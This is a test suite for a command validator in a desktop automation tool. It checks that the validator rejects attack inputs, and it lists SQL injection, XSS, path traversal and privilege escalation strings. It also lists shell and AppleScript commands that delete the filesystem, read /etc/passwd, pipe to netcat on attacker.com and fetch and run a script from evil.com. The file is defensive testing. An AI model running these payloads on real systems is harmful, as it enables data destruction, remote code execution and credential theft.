import { validateCommand } from '@/lib/commandValidator';
import { parseCommand } from '@/lib/commandParser';

describe('Security Audit Tests', () => {
  describe('Input Sanitization', () => {
    test('should prevent SQL injection attempts', () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM passwords --"
      ];

      maliciousInputs.forEach(input => {
        const command = `search for ${input}`;
        const parsed = parseCommand(command);
        const validation = validateCommand(command, parsed);
        
        expect(validation.sanitizedCommand?.parameters.searchTerm).not.toContain("'");
        expect(validation.sanitizedCommand?.parameters.searchTerm).not.toContain('"');
      });
    });

    test('should prevent XSS attacks', () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
        '"><script>alert(document.cookie)</script>'
      ];

      xssPayloads.forEach(payload => {
        const command = `search for ${payload}`;
        const parsed = parseCommand(command);
        const validation = validateCommand(command, parsed);
        
        expect(validation.isValid).toBe(false);
      });
    });

    test('should prevent command injection', () => {
      const commandInjections = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc attacker.com 4444',
        'test `whoami`',
        'test $(id)'
      ];

      commandInjections.forEach(injection => {
        const parsed = parseCommand(injection);
        const validation = validateCommand(injection, parsed);
        
        expect(validation.isValid).toBe(false);
      });
    });

    test('should prevent path traversal attacks', () => {
      const pathTraversals = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '....//....//....//etc/passwd'
      ];

      pathTraversals.forEach(path => {
        const command = `open file ${path}`;
        const parsed = parseCommand(command);
        const validation = validateCommand(command, parsed);
        
        expect(validation.isValid).toBe(false);
      });
    });
  });

  describe('AppleScript Security', () => {
    test('should prevent dangerous AppleScript commands', () => {
      const dangerousCommands = [
        'do shell script "rm -rf /"',
        'do shell script "sudo rm -rf /"',
        'do shell script "curl http://evil.com/malware | sh"',
        'administrator privileges',
        'do shell script "launchctl load /Library/LaunchDaemons/evil.plist"'
      ];

      dangerousCommands.forEach(cmd => {
        const parsed = parseCommand(cmd);
        const validation = validateCommand(cmd, parsed);
        
        expect(validation.isValid).toBe(false);
        expect(validation.errors.some(e => e.includes('harmful patterns'))).toBe(true);
      });
    });

    test('should prevent privilege escalation attempts', () => {
      const privilegeEscalation = [
        'tell application "System Events" to set admin privileges',
        'do shell script "sudo su -"',
        'tell application "Terminal" to do script "sudo -s"',
        'administrator privileges required'
      ];

      privilegeEscalation.forEach(cmd => {
        const parsed = parseCommand(cmd);
        const validation = validateCommand(cmd, parsed);
        
        expect(validation.isValid).toBe(false);
      });
    });
  });

  describe('File System Security', () => {
    test('should restrict file access to safe directories', () => {
      const restrictedPaths = [
        '/System/Library/Passwords',
        '/etc/passwd',
        '/var/root/',
        '/Library/Keychains',
        '/usr/bin',
        '/Applications/Utilities/Keychain Access.app'
      ];

      restrictedPaths.forEach(path => {
        const command = `open file ${path}`;
        const parsed = parseCommand(command);
        parsed.parameters.filePath = path;
        const validation = validateCommand(command, parsed);
        
        if (validation.isValid) {
          // Should have warnings about sensitive access
          expect(validation.warnings.length).toBeGreaterThan(0);
        } else {
          // Should be blocked entirely
          expect(validation.errors.some(e => e.includes('not allowed'))).toBe(true);
        }
      });
    });

    test('should allow access to user directories', () => {
      const safePaths = [
        '~/Desktop/test.txt',
        '~/Documents/file.pdf',
        '~/Downloads/image.jpg',
        '~/Pictures/photo.png'
      ];

      safePaths.forEach(path => {
        const command = `open file ${path}`;
        const parsed = parseCommand(command);
        parsed.parameters.filePath = path;
        const validation = validateCommand(command, parsed);
        
        // Should be valid or have only minor warnings
        if (!validation.isValid) {
          expect(validation.errors.every(e => !e.includes('not allowed'))).toBe(true);
        }
      });
    });
  });

  describe('Network Security', () => {
    test('should validate URLs for malicious schemes', () => {
      const maliciousUrls = [
        'ftp://evil.com/malware',
        'file:///etc/passwd',
        'javascript:alert("xss")',
        'data:text/html,<script>alert(1)</script>',
        'ldap://attacker.com/payload'
      ];

      maliciousUrls.forEach(url => {
        const command = `open ${url}`;
        const parsed = parseCommand(command);
        parsed.parameters.url = url;
        const validation = validateCommand(command, parsed);
        
        expect(validation.isValid).toBe(false);
      });
    });

    test('should warn about localhost access', () => {
      const localUrls = [
        'http://localhost:3000',
        'https://127.0.0.1:8080',
        'http://192.168.1.1',
        'https://10.0.0.1'
      ];

      localUrls.forEach(url => {
        const command = `open ${url}`;
        const parsed = parseCommand(command);
        parsed.parameters.url = url;
        const validation = validateCommand(command, parsed);
        
        if (validation.isValid) {
          expect(validation.warnings.some(w => w.includes('local network'))).toBe(true);
        }
      });
    });
  });

  describe('Rate Limiting & DoS Prevention', () => {
    test('should reject extremely long inputs', () => {
      const longInput = 'a'.repeat(2000);
      const parsed = parseCommand(longInput);
      const validation = validateCommand(longInput, parsed);
      
      expect(validation.isValid).toBe(false);
      expect(validation.errors.some(e => e.includes('too long'))).toBe(true);
    });

    test('should handle multiple rapid validation requests', () => {
      const commands = Array(100).fill('test command');
      
      const startTime = Date.now();
      const results = commands.map(cmd => {
        const parsed = parseCommand(cmd);
        return validateCommand(cmd, parsed);
      });
      const endTime = Date.now();
      
      // Should complete within reasonable time (not hanging)
      expect(endTime - startTime).toBeLessThan(5000);
      
      // All should be processed
      expect(results).toHaveLength(100);
      results.forEach(result => {
        expect(result).toBeDefined();
      });
    });
  });

  describe('Sensitive Data Protection', () => {
    test('should detect and warn about sensitive keywords', () => {
      const sensitiveInputs = [
        'show me passwords',
        'open keychain access',
        'find my private keys',
        'search for admin credentials',
        'display secret tokens'
      ];

      sensitiveInputs.forEach(input => {
        const parsed = parseCommand(input);
        const validation = validateCommand(input, parsed);
        
        if (validation.isValid) {
          expect(validation.warnings.length).toBeGreaterThan(0);
        } else {
          expect(validation.errors.some(e => e.includes('harmful patterns'))).toBe(true);
        }
      });
    });

    test('should not log sensitive information', () => {
      const sensitiveCommand = 'set password to secret123';
      const parsed = parseCommand(sensitiveCommand);
      const validation = validateCommand(sensitiveCommand, parsed);
      
      // Validation should complete without exposing sensitive data
      expect(validation).toBeDefined();
      
      // If sanitized, sensitive data should be removed or masked
      if (validation.sanitizedCommand) {
        const sanitizedStr = JSON.stringify(validation.sanitizedCommand);
        expect(sanitizedStr).not.toContain('secret123');
      }
    });
  });

  describe('Browser Security', () => {
    test('should validate web URLs for safety', () => {
      const suspiciousUrls = [
        'http://bit.ly/malware',
        'https://tinyurl.com/evil',
        'http://127.0.0.1:8080/admin',
        'https://suspicious-domain.tk'
      ];

      suspiciousUrls.forEach(url => {
        const command = `navigate to ${url}`;
        const parsed = parseCommand(command);
        parsed.parameters.url = url;
        const validation = validateCommand(command, parsed);
        
        // Should either block or warn
        if (validation.isValid) {
          expect(validation.warnings.length).toBeGreaterThan(0);
        }
      });
    });
  });
});